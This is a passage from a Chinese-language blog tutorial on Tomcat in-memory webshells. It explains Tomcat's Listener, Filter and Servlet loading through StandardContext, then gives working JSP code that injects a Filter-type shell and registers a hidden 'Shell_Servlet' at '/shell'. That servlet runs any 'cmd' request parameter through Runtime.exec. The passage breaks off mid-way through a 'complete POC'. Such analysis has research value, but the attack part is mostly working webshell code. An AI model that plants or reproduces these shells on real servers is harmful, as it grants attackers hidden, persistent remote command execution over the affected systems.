class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230801212525992.png" alt="image-20230801212525992"></p><p>先运行<code>Listener.jsp</code>  然后将内存马写入  然后就可以直接访问了</p><p><img src="../images/image-20230801212612721.png" alt="image-20230801212612721"></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>我们知道Servlet的生命周期分为如下五部分</p><ol><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ol><p>在<code>org.apache.catalina.core.StandardContext</code>类的<code>startInternal()</code>方法中，我们能看到<code>Listener-&gt;Filter-&gt;Servlet</code>的加载顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!listenerStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.listenerFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Start manager</span></span><br><span class="line">                <span class="type">Manager</span> <span class="variable">manager</span> <span class="operator">=</span> getManager();</span><br><span class="line">                <span class="keyword">if</span> (manager <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle) manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.managerFail&quot;</span>), e);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Configure and call application filters</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Load and initialize all &quot;load on startup&quot; servlets</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!loadOnStartup(findChildren()))&#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Start ContainerBackgroundProcessor thread</span></span><br><span class="line">            <span class="built_in">super</span>.threadStart();</span><br><span class="line">        &#125;<span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!listenerStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.listenerFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Start manager</span></span><br><span class="line">                <span class="type">Manager</span> <span class="variable">manager</span> <span class="operator">=</span> getManager();</span><br><span class="line">                <span class="keyword">if</span> (manager <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle) manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.managerFail&quot;</span>), e);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Configure and call application filters</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Load and initialize all &quot;load on startup&quot; servlets</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!loadOnStartup(findChildren()))&#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Start ContainerBackgroundProcessor thread</span></span><br><span class="line"> </span><br><span class="line">            <span class="built_in">super</span>.threadStart();</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件，我们跟进</p><p><img src="../images/image-20230801220307680.png" alt="image-20230801220307680"></p><p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p><p><img src="../images/image-20230801220508975.png" alt="image-20230801220508975"></p><p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化<code>StandWrapper</code>对象</p><p><img src="../images/image-20230801220610745.png" alt="image-20230801220610745"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        <span class="comment">// As far as possible, process in alphabetical order so it is easy to</span></span><br><span class="line">        <span class="comment">// check everything is present</span></span><br><span class="line">        <span class="comment">// Some validation depends on correct public ID</span></span><br><span class="line">        context.setPublicId(webxml.getPublicId());</span><br><span class="line"> </span><br><span class="line">...   <span class="comment">//设置StandardContext参数</span></span><br><span class="line"> </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//创建StandardWrapper对象</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//设置LoadOnStartup属性</span></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletName属性</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletClass属性</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            ...</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">          </span><br><span class="line">            <span class="comment">//添加路径映射</span></span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p><h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p><p><img src="../images/image-20230801225654423.png" alt="image-20230801225654423"></p><p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">       TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">       <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">           <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">           <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line"></span><br><span class="line">           <span class="comment">//判断属性loadOnStartup的值</span></span><br><span class="line">           <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">           ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">           <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">               list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">               map.put(key, list);</span><br><span class="line">           &#125;</span><br><span class="line">           list.add(wrapper);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">       <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">           <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   wrapper.load();</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure><p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p><p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。</p><p><img src="../images/image-20230801225907335.png" alt="image-20230801225907335"></p><h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上文的分析我们能够总结出创建Servlet的流程</p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li></ol><p><img src="../images/image-20230801230244943.png" alt="image-20230801230244943"></p><p>这里的<code>StandardContext</code>可控  所以直接就使用该方法来直接构造</p><ol><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>属性值</li></ol><p><img src="../images/image-20230802101748580.png" alt="image-20230802101748580"></p><p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p><p><img src="../images/image-20230802102205318.png" alt="image-20230802102205318"></p><p>在创建这个对象的时候也会顺便创建这个值</p><ol><li>设置<code>StandardWrapper</code>对象的<code>ServletName</code>属性值</li></ol><p><strong>这是在创建<code>StandardWrapper</code>的时候可以看到的</strong></p><p><img src="../images/image-20230802102344977.png" alt="image-20230802102344977"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><ol><li>设置<code>StandardWrapper</code>对象的<code>ServletClass</code>属性值</li></ol><p><img src="../images/image-20230802102453965.png" alt="image-20230802102453965"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><ol><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li></ol><p><img src="../images/image-20230802102531093.png" alt="image-20230802102531093"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><ol><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><p><img src="../images/image-20230802102614271.png" alt="image-20230802102614271"></p><p>也是在创建这个<strong><code>StandardWrapper</code></strong>的时候会赋值的</p><p><strong>这里的步骤都是基于上面的分析   在这个创建<code>StandardWrapper</code>的方法中都可以看到是对上述参数的赋值</strong></p><h5 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h5><p>这里的获取<code>StandardContext</code>的方法多种多样  在上面的两种内存马类型都能看到了</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>或者</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="编写恶意Servlet"><a href="#编写恶意Servlet" class="headerlink" title="编写恶意Servlet"></a>编写恶意Servlet</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="创建Wrapper对象"><a href="#创建Wrapper对象" class="headerlink" title="创建Wrapper对象"></a>创建Wrapper对象</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="将Wrapper添加进StandardContext"><a href="#将Wrapper添加进StandardContext" class="headerlink" title="将Wrapper添加进StandardContext"></a>将Wrapper添加进StandardContext</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span 